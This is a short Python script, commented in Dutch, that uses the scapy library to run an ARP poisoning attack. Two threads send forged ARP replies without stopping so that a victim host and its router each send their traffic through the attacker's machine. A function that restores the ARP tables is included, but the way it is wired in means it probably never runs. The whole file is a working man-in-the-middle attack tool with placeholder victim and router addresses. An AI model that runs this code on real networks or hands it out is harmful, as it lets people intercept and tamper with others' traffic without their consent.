from scapy.all import ARP, send
import threading
import time

# Functie om ARP-poisoning uit te voeren
def arp_poison(target_ip, target_mac, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    while True:
        send(packet, verbose=0)
        time.sleep(2)  # Herhaal om de ARP-tafel vervalst te houden

# Functie om ARP-tabellen te herstellen na de aanval
def restore_arp(target_ip, target_mac, spoof_ip, spoof_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(packet, count=5, verbose=0)

# Instellingen voor ARP-poisoning
victim_ip = "192.168.1.100"  # IP-adres van het slachtoffer
victim_mac = "00:0c:29:68:22:51"  # MAC-adres van het slachtoffer
router_ip = "192.168.1.1"  # IP-adres van de router
router_mac = "00:1a:2b:3c:4d:5e"  # MAC-adres van de router

try:
    print("Starting ARP poisoning...")
    threading.Thread(target=arp_poison, args=(victim_ip, victim_mac, router_ip)).start()
    threading.Thread(target=arp_poison, args=(router_ip, router_mac, victim_ip)).start()
except KeyboardInterrupt:
    print("\nStopping ARP poisoning and restoring ARP tables...")
    restore_arp(victim_ip, victim_mac, router_ip, router_mac)
    restore_arp(router_ip, router_mac, victim_ip, victim_mac)
    print("ARP tables restored.")
